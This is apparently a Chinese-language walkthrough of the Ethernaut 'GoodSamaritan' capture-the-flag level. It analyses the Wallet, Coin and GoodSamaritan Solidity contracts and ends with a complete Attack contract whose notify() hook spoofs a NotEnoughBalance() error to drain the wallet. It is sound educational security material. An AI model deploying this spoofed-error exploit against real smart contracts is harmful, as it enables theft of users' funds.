# GoodSamaritan

## Reference
[GoodSamaritan](https://ethernaut.openzeppelin.com/level/27)

[GoodSamaritan.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/27-GoodSamaritan/GoodSamaritan.sol)

[//]: # ([ABiCode]&#40;https://medium.com/@scourgedev/deep-dive-into-abi-encode-types-padding-and-disassembly-84472f1b4543&#41;)

## 目标
掏空奖池

## 分析
### Wallet
```solidity
    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }
```
#### wallet函数分析
1. `donate10()` 函数存在两个分支：
   1. 钱包余额小于10的话，返回 `revert NotEnoughBalance()` 报错
   2. 调用 `Coin-transfer()` 函数，转账 `10Token` 到特定账户。
2. `transferRemainder()` 函数，调用 `Coin` 合约，将 `wallet` 全部资产转到特定地址
### Coin
```solidity
    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
```
#### coin函数分析
1. `Coin-transfer()` 函数首先查询调用者的余额，和转账金额进行匹配：
   1. 匹配成功的话：
      1. 更新 `from/to` 的地址的余额 
      2. 如果 `to` 地址是合约地址的话，调用 `to-的notify()` 函数
   2. 匹配失败的话，返回 `revert InsufficientBalance()` 错误
   
### GoodSamaritan
```solidity
    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (
                keccak256(abi.encodeWithSignature("NotEnoughBalance()")) ==
                keccak256(err)
            ) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
```
#### 函数分析
1. `requestDonation` 函数捕获 `wallet-donate10` 的异常：
   1. 无异常的话，返回 `true`
   2. 如果异常类型是 `NotEnoughBalance()` 的错误：
      1. 默认余额不足，调用 `Wallet-transferRemainder()` 函数转账全部资产
   3. 不捕获其余异常

## 攻击合约分析
```solidity
    function notify(uint256 amount) external {
   // while (coin.balances(address(wallet)) > 999690) {
   //     goodSamaritan.requestDonation();
   // }
   if (amount <= 10) {
      revert NotEnoughBalance();
   }
}
```
1. `to` 合约调用 `GoodSamaritan-requestDonation()` 函数，并捕获异常： 
   1. 首先调用 `Wallet-donate10()` 函数，`Wallet` 钱包存在 `10**6Token` , 进入 `Wallet-donate10()` 第二分支`（Coin-transfer）` 
   2. `Wallet` 钱包存在足额资产，在 `Coin-transfer()` 中进入第一分支 
   3. 在 `Coin-transfer()` 第一分支中，首先更新 `from/to` 地址余额，之后调用 `to-notify()` 函数
   4. `to` 合约中定义 `notify()` 函数，在余额小于等于10的情况下返回 `revert NotEnoughBalance()` 报错
2. `GoodSamaritan-requestDonation()` 函数捕获到异常：`NotEnoughBalance()`
   1. 在 `NotEnoughBalance` 异常匹配中，调用 `Wallet-transferRemainder()` 函数
   2. `Wallet-transferRemainder()` 函数 底层调用 `Coin-transfer()` 函数，转移全部的Token资产
   3. `Coin-transfer()` 函数进入转账环节，在调用 `to-notify()` 函数时，余额不小于10，则不会返回 `revert` 报错
   4. 交易完成

### Attack合约
```solidity
contract Attack is INotifyable {
    GoodSamaritan public goodSamaritan;
    // Coin coin;
    // Wallet wallet;
    error NotEnoughBalance();

    constructor(GoodSamaritan _goodSamaritan) //   Coin _coin,
    // Wallet _wallet
    {
        goodSamaritan = _goodSamaritan;
        // coin = _coin;
        // wallet = _wallet;
    }

    function notify(uint256 amount) external {
        // while (coin.balances(address(wallet)) > 999690) {
        //     goodSamaritan.requestDonation();
        // }
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }
}
```
